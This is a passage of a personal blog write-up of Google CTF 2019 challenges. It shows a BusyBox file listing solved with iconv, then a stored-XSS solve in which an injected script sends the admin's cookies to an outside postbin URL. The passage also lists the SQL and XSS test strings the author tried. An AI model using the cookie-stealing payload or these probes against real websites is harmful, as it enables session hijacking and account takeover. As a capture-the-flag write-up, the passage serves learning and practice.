+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">kill</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">login</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+&gt;
+<span style="color:#f92672">...</span></code></pre></div>
+We can see, that the system is running BusyBox. <a href="https://en.wikipedia.org/wiki/BusyBox">BusyBox</a> is a software suite that provides several Unix utilities in a single executable file. It runs in a variety of POSIX environments.</p>
+<p>The <a href="https://www.geeksforgeeks.org/iconv-command-in-linux-with-examples/">iconv</a> command is the right solution in this case. It is used to convert some text in one encoding into another encoding. If no input file is provided then it reads from standard input. Similarly, if no output file is given then it writes to standard output.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">&gt; <span style="color:#a6e22e">iconv</span> <span style="color:#a6e22e">README</span>.<span style="color:#a6e22e">flag</span>
+<span style="color:#a6e22e">CTF</span>{<span style="color:#ae81ff">4</span><span style="color:#a6e22e">ll_D474_5h4ll_B3_Fr33</span>}
+&gt;</code></pre></div>
+<h2 id="5-government-agriculture-network">5. Government Agriculture Network</h2>
+<p>For this callange we got a link to a website. What i notice directly from the website is that the user can enter and submit posts.
+<img src="/img/GoogleCTF2019/challange4.1.png" alt="Image Challange4.1"></p>
+<p>Submitting the post tells us, that it is submitted for review by the admin.</p>
+<p>Additionally we have an admin button, which does not forward us - apparently we are not authenticated.</p>
+<p><img src="/img/GoogleCTF2019/challange4.2.jpg" alt="Image Challange4.2"></p>
+<p>First I have tested some SQL escape characters <em><code>', &quot;, #, )</code></em> and simple XXS injection <em><code>'&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt; </code></em> to check, how the site handles them. - It again just showed me the message: <em><code>Your post was submitted for review. Administator will take a look shortly.</code></em></p>
+<p>After a long time of unsuccessful testing of the website with Burp i realized that the displayed message gives a hint on the processing of the input. <em>This will be processed by the admin after submitting.</em></p>
+<p>Finally i was able to get the flag by injecting code, that is making a request to a custom server and sending the cookies as parameters.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">&lt;<span style="color:#a6e22e">script</span>&gt;
+<span style="color:#a6e22e">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span>=<span style="color:#e6db74">&#34;https://postb.in/1586379679053-9640627398621?output=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">document</span>.<span style="color:#a6e22e">cookie</span>;
+&lt;<span style="color:#f92672">/</span><span style="color:#a6e22e">script</span>&gt;</code></pre></div>
+<p><img src="/img/GoogleCTF2019/challange4.3.png" alt="Image Challange4.3"></p>
+<p>CTF{8aaa2f34b392b415601804c2f5f0f24e}</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://T0XICITY.com/blog/this-website/">
+                  <span class="button__text">Development process of this website</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+    <div class="footer__inner">
+        
+        <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">T0XICITY</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+        
+    </div>
+</footer>
+
+<script src="https://T0XICITY.com/assets/main.js"></script>
+<script src="https://T0XICITY.com/assets/prism.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<div style="font-size: 2rem;">
+<a style="text-decoration:none;" href="https://github.com/T0XICITY" target="_blank" rel="noopener" class="fa fa-github"></a>
+<a style="text-decoration:none" href="https://twitter.com/t0xicity__"target="_blank" rel="noopener" class="fa fa-twitter"></a>
+<a style="text-decoration:none" href="mailto:klingenbergpa95@gmail.com" target="_blank" rel="noopener" class="fa fa-envelope"></a>
+</div>
+
+
+<div class="copyright copyright--user">© 2020 Patrick Klingenberg </div>
+
+<span ><a style="text-decoration:none" href="/privacy">Imprint / Contact / Privacy</a> </span>
+
+<div style="font-size: 0.8rem;line-height: 2rem;">
+    <span> Powered by <a style="text-decoration:none" href="https://gohugo.io" target="_blank" rel="noopener">Hugo | </a></span>
+    <span>Theme created by <a style="text-decoration:none" href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+</div>
+      
+    </div>
+
+    
+  </body>
+</html>
